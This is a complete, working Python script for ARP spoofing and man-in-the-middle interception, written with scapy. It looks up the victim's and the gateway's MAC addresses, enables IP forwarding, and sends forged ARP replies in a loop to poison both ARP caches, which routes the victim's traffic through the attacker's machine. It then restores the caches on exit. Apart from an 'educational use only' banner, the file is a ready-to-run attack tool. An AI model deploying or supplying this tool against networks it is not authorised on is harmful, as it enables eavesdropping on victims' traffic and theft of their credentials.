#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║           ARP SPOOFER + MITM INTERCEPTOR             ║
║              For Educational Use Only                ║
║         Use only on networks you own/control         ║
╚══════════════════════════════════════════════════════╝
"""

from scapy.all import ARP, Ether, srp, send
import time
import sys
import os
import subprocess

# ─── Colors ────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}
 █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗  
██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  
██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝╚██████╔╝██║     
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     
{RESET}
{YELLOW}            [ ARP Spoofer + MITM Traffic Interceptor ]{RESET}
{RED}            [ Educational Use Only — Use Responsibly  ]{RESET}
""")

def get_mac(ip):
    """Get MAC address of a given IP using ARP request."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"{RED}[!] Could not get MAC for {ip}. Is it online?{RESET}")
        sys.exit(1)

def spoof(target_ip, spoof_ip, target_mac):
    """Send a fake ARP reply to poison the target's ARP cache."""
    packet = ARP(
        op=2,               # op=2 means ARP reply
        pdst=target_ip,     # target IP
        hwdst=target_mac,   # target MAC
        psrc=spoof_ip       # pretend to be this IP
    )
    send(packet, verbose=False)

def restore(dest_ip, src_ip, dest_mac, src_mac):
    """Restore original ARP tables when we're done."""
    packet = ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=src_ip,
        hwsrc=src_mac
    )
    send(packet, count=5, verbose=False)

def enable_ip_forwarding():
    """Enable IP forwarding so victim traffic still flows through."""
    print(f"{CYAN}[*] Enabling IP forwarding...{RESET}")
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                   capture_output=True)
    print(f"{GREEN}[+] IP forwarding enabled ✓{RESET}")

def disable_ip_forwarding():
    """Disable IP forwarding on exit."""
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                   capture_output=True)
    print(f"{YELLOW}[*] IP forwarding disabled{RESET}")

def run_spoofer(victim_ip, gateway_ip):
    banner()

    print(f"{CYAN}[*] Getting MAC addresses...{RESET}")
    victim_mac  = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"{GREEN}[+] Victim  : {victim_ip}  →  {victim_mac}{RESET}")
    print(f"{GREEN}[+] Gateway : {gateway_ip}  →  {gateway_mac}{RESET}")
    print(f"\n{YELLOW}[!] Starting ARP poisoning... Press CTRL+C to stop\n{RESET}")

    enable_ip_forwarding()

    packets_sent = 0
    try:
        while True:
            # Poison victim: "I am the gateway"
            spoof(victim_ip, gateway_ip, victim_mac)
            # Poison gateway: "I am the victim"
            spoof(gateway_ip, victim_ip, gateway_mac)

            packets_sent += 2
            print(f"\r{RED}[+] Packets sent: {packets_sent}{RESET}", end="")
            time.sleep(1.5)

    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Detected CTRL+C — Restoring ARP tables...{RESET}")
        restore(victim_ip, gateway_ip, victim_mac, gateway_mac)
        restore(gateway_ip, victim_ip, gateway_mac, victim_mac)
        disable_ip_forwarding()
        print(f"{GREEN}[+] ARP tables restored. Exiting cleanly. ✓{RESET}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}[!] Run as root: sudo python3 arp_spoofer.py{RESET}")
        sys.exit(1)

    if len(sys.argv) != 3:
        print(f"{YELLOW}Usage: sudo python3 arp_spoofer.py <victim_ip> <gateway_ip>{RESET}")
        print(f"Example: sudo python3 arp_spoofer.py 192.168.1.105 192.168.1.1")
        sys.exit(1)

    victim_ip  = sys.argv[1]
    gateway_ip = sys.argv[2]

    run_spoofer(victim_ip, gateway_ip)
